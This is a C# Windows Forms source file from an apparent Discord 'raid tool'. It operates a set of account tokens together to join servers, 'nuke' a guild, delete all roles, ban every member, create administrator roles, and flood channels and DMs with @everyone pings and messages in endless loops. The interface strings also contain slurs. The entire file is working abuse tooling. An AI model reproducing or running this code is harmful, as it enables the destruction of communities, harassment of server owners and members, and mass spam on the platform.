using Discord;
using Discord.Gateway;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using static QvoidDiscord.Discord;

namespace Discord_Raid_Tool_Final.Forms
{
    public partial class GuildsForm : Form
    {
        private string MessageContent = "";
        private ulong GuildId = 0;
        private string GuildInviteCode = "";
        private ulong ChannelId = 0;

        public GuildsForm()
        {
            InitializeComponent();
        }

        private void MessageTextBox_TextChanged(object sender, EventArgs e)
        {
            MessageContent = MessageTextBox.Text;
        }

        private void GuildIdTextBox_TextChanged(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(GuildIdTextBox.Text) || String.IsNullOrWhiteSpace(GuildIdTextBox.Text))
                return;

            try { GuildId = ulong.Parse(GuildIdTextBox.Text); }
            catch
            {
                if (GuildIdTextBox.Text.Length > 1)
                    GuildIdTextBox.Text = GuildIdTextBox.Text.Substring(0, GuildIdTextBox.Text.Length - 1);
                else
                    GuildIdTextBox.Text = "";

                MessageBox.Show("Retard enter a vaild guild id!");
            }
        }

        private void GuildInviteCodeTextBox_TextChanged(object sender, EventArgs e)
        {
            GuildInviteCode = GuildInviteCodeTextBox.Text;
        }

        private void ChannelIdTextBox_TextChanged(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(ChannelIdTextBox.Text) || String.IsNullOrWhiteSpace(ChannelIdTextBox.Text))
                return;

            try { ChannelId = ulong.Parse(ChannelIdTextBox.Text); }
            catch
            {
                if (ChannelIdTextBox.Text.Length > 1)
                    ChannelIdTextBox.Text = ChannelIdTextBox.Text.Substring(0, ChannelIdTextBox.Text.Length - 1);
                else
                    ChannelIdTextBox.Text = "";

                MessageBox.Show("Retard enter a vaild channel id!");
            }
        }

        private void LeaveButton_Click(object sender, EventArgs e)
        {
            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.Tokens.Count; ++i)
            {
                try
                {
                    Client client = new Client(Settings.Tokens[i], new Client.Config { ApiVersion = 9 });
                    Guild guild = new Guild(client, GuildId);
                    guild.Leave();
                }
                catch (DiscordHttpException ex) { MessageBox.Show(ex.ErrorMessage); }
            }
        }

        private void JoinButton_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(GuildInviteCode) || String.IsNullOrWhiteSpace(GuildInviteCode))
            {
                MessageBox.Show("Enter a vaild guild invite!!!!!!!!!");
                return;
            }

            GuildInviteCode = GuildInviteCode.Replace("discord.gg/", "");
            GuildInviteCode = GuildInviteCode.Replace("https://discord.com/invite/", "");
            GuildInviteCode = GuildInviteCode.Replace("https://discord.gg/", "");
            GuildInviteCode = GuildInviteCode.Replace("https://", "");

            for (int i = 0; i < Settings.Tokens.Count; ++i)
            {
                try
                {
                    Client client = new Client(Settings.Tokens[i], new Client.Config { ApiVersion = 9 });
                    Guild.JoinGuild(client, GuildInviteCode);
                }
                catch (Exception ex) { MessageBox.Show(ex.Message); }
            }
        }

        private void NukeGuildButton_Click(object sender, EventArgs e)
        {
            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }
                if (guild != null)
                {
                    if (i == 0)
                        DiscordUtils.NukeGuild(Settings.DiscordClients[i], GuildId, MessageContent, new string[] { "fuck you", "github - Enum0x539" }, 20, true);
                    else
                        DiscordUtils.NukeGuild(Settings.DiscordClients[i], GuildId, MessageContent, new string[] { "fuck you", "github - Enum0x539" }, 20, false);
                }
            }
        }

        private void BullyOwnerButton_Click(object sender, EventArgs e)
        {
            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetCachedGuilds();
                var guild = new SocketGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }
                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        while (true)
                        {
                            try
                            {
                                Settings.DiscordClients[i].SendMessage(Settings.DiscordClients[i].CreateDM(guild.OwnerId).Id, MessageContent);
                            }
                            catch { }
                        }
                    });
                    thread.Start();
                }
            }
        }

        private void DeleteRolesButton_Click(object sender, EventArgs e)
        {
            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }

                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        IReadOnlyList<DiscordRole> roles = guild.GetRoles();
                        foreach (var role in roles.ToList())
                            role.Delete();
                    });
                    thread.Start();
                }
            }
        }

        private void TagEveryoneButton_Click(object sender, EventArgs e)
        {
            if (ChannelId == 0 && ChannelId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild channel id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }

                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        while (true)
                            Settings.DiscordClients[i].SendMessage(ChannelId, "@everyone");
                    });
                    thread.Start();
                }
            }
        }

        private void MessageEveryoneButton_Click(object sender, EventArgs e)
        {
            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            if (ChannelId == 0 && ChannelId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild channel id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }

                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        IReadOnlyList<GuildMember> members = Settings.DiscordClients[i].GetGuildChannelMembers(GuildId, ChannelId);
                        while (true)
                        {
                            foreach (var member in members.ToList())
                            {
                                var pm = Settings.DiscordClients[i].CreateDM(member.User.Id);
                                Settings.DiscordClients[i].SendMessage(pm.Id, MessageContent);
                            }
                        }
                    });
                    thread.Start();
                }
            }
        }

        private void SpamRolesButton_Click(object sender, EventArgs e)
        {
            if (ChannelId == 0 && ChannelId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild channel id!!!!!!!!!");
                return;
            }

            if (GuildId == 0 && GuildId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild guild id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }

                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        Settings.DiscordClients[i].CreateRole(GuildId, new RoleProperties { Color = Color.Red, Mentionable = true, Permissions = DiscordPermission.Administrator, Seperated = true, Name = "github.com/Enum0x359" });
                    });
                    thread.Start();
                }
            }
        }

        private void NoUsageButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Bruh it is written that this button has no usage!");
        }

        private void BanEveryoneButton_Click(object sender, EventArgs e)
        {
            if (ChannelId == 0 && ChannelId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild channel id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var guild = new PartialGuild();
                foreach (var _ in guilds)
                    if (_.Id == GuildId)
                    {
                        guild = _;
                        break;
                    }

                if (guild != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        DiscordUtils.BanEveryone(Settings.DiscordClients[i], GuildId, ChannelId);
                    });
                    thread.Start();
                }
            }
        }

        private void SpamTagUserButton_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(MessageContent) || String.IsNullOrWhiteSpace(MessageContent))
            {
                MessageBox.Show("The message content is empty!");
                return;
            }

            if (ChannelId == 0 && ChannelId.ToString().Length != 16)
            {
                MessageBox.Show("Enter a vaild channel id!!!!!!!!!");
                return;
            }

            for (int i = 0; i < Settings.DiscordClients.Count; ++i)
            {
                var guilds = Settings.DiscordClients[i].GetGuilds();
                var channelM = new GuildChannel();
                    foreach (var _ in guilds)
                    {
                        IReadOnlyList<GuildChannel> channels = _.GetChannels();
                        foreach (var channel in channels)
                            if (channel.Id == ChannelId)
                            {
                                channelM = channel;
                                break;
                            }
                    }

                if (channelM != null)
                {
                    Thread thread = new Thread(() =>
                    {
                        while (true)
                            Settings.DiscordClients[i].SendMessage(ChannelId, MessageContent);
                    });
                    thread.Start();
                }
            }
        }
    }
}